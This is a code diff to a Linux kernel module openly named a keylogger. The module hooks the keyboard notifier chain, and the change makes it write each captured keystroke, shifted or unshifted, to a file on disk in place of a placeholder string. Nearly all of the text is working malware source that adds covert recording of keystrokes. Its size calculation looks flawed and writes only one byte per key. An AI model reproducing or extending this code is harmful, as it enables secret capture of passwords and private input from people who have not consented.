@@ -15,7 +15,7 @@ MODULE_VERSION("1.0");
 
 struct semaphore sem;
 
-void WriteToFile(void);
+void WriteToFile(char*, size_t);
 int setup_disk(void);
 ssize_t write_vaddr_disk(void *, size_t);
 
@@ -62,10 +62,14 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
         if(param->down)
         {
             down(&sem);
-            if(UnpressedKey == 0)
+            if(UnpressedKey == 0){
+                WriteToFile((char *)NoShift[param->value], sizeof(*NoShift[param->value]));
                 printk(KERN_INFO "%s \n", NoShift[param->value]);
-            else
+            }
+            else{
+                WriteToFile((char *)YesShift[param->value], sizeof(*YesShift[param->value]));
                 printk(KERN_INFO "%s \n", YesShift[param->value]);
+            }
             up(&sem);
         }
     }
@@ -84,7 +88,6 @@ static int __init init_keylogger(void)
     register_keyboard_notifier(&keylogger_nb);
     printk(KERN_INFO "Registering the keylogger with the keyboard notifier list\n");
     sema_init(&sem, 1);
-    WriteToFile();
     return 0;
 }
 
@@ -97,14 +100,14 @@ static void __exit cleanup_keylogger(void)
 module_init(init_keylogger);
 module_exit(cleanup_keylogger);
 
-void WriteToFile(){
+void WriteToFile(char *phrase, size_t num_bytes){
 
    int err = 0;
 
     printk(KERN_INFO "File to Open: %s\n", fullFileName);
   filepath = fullFileName; // set for disk write code
   err = setup_disk();
-  err = write_vaddr_disk("none", 4);
+  err = write_vaddr_disk(phrase, num_bytes);
   cleanup_disk();
 }
 
